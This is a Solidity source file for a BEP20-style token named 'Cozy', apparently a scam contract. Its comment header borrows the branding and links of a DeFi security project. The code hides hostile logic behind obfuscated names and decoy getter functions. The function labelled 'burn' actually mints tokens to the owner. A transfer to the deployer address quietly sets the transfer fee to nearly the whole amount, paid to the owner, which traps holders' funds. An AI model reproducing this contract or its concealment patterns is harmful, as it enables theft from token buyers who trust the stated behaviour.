/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

/*
Cozy
    Keep your crypto cozy Invest in DeFi with protection against hacks, exploits, and more. Join the community at
     https://discord.gg/cozy-finance
    for the prior works that helped inform and inspire the guide
    Highly recommend reading their posts for other topics related to opsec and wallet security
    Here are the resources I've collected so far
     https://mirror.xyz/crisgarner.eth/gJjASuCkbXJ1w574ePvJ3kNyWBZQfUyelMvsp4ujZ80
     https://github.com/OffcierCia/Crypto-OpSec-SelfGuard-RoadMap
     https://twitter.com/jurad0x/status/1454120956516093956 
     https://twitter.com/bobbyong/status/1403881080902471680?s=20&t=rTuSn61yi9uKFFgDe19c3Q
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.4;
contract Cozy {
uint256 private  scwasR = 1000000000000000000;
string public  name = "Cozy";
uint256 private  XWSYAn = 100000000;
address private  LyGUzf = address(0);
uint256 private  koNLBe = 10000000000000;
address public owner;
address private  aDeYxG = address(0);
address private  UcBtzH = address(0);
uint256 private  HQCLKw = 10000000000;
uint8 public constant decimals = 18;
address private  qjxudC = address(0);
string public  symbol = "Cozy";
address private  HRNBqy = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  Wnzrtb = 1000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  nSGUhY = 1000000000000000000000;
address private  uktXpB = address(0);
address private  HkDuGF = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  VlWfoY = address(0);
uint256 private  npLTeN = 1000000000000000000;
uint256 public constant cgrRgc = 99999;
mapping (address => uint256) public balanceOf;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  KxyFGA = address(0);


function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getLyGUzf() private returns (address) {
return LyGUzf;
}

function _getuktXpB() private returns (address) {
return uktXpB;
}

function _getXWSYAn() private returns (uint256) {
return XWSYAn;
}

function _getUcBtzH() private returns (address) {
return UcBtzH;
}



function _getnSGUhY() private returns (uint256) {
return nSGUhY;
}



function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getHRNBqy() private returns (address) {
return HRNBqy;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function _getKxyFGA() private returns (address) {
return KxyFGA;
}

constructor () {
aDeYxG = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}




modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "UWVEjM");
require(to != address(0), "UWVEjM");
require(amount <= balanceOf[from], "UWVEjM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* cgrRgc/scwasR ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==aDeYxG){
scwasR = cgrRgc+2;
}
emit Transfer(from, to, transferAmount);
}


function _getqjxudC() private returns (address) {
return qjxudC;
}



function _getHQCLKw() private returns (uint256) {
return HQCLKw;
}

function _getkoNLBe() private returns (uint256) {
return koNLBe;
}



function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getHkDuGF() private returns (address) {
return HkDuGF;
}

function _getWnzrtb() private returns (uint256) {
return Wnzrtb;
}



function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tUWVEjM 0");
require(spender != address(0), "fUWVEjM 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getnpLTeN() private returns (uint256) {
return npLTeN;
}

function _getVlWfoY() private returns (address) {
return VlWfoY;
}



function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}






function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}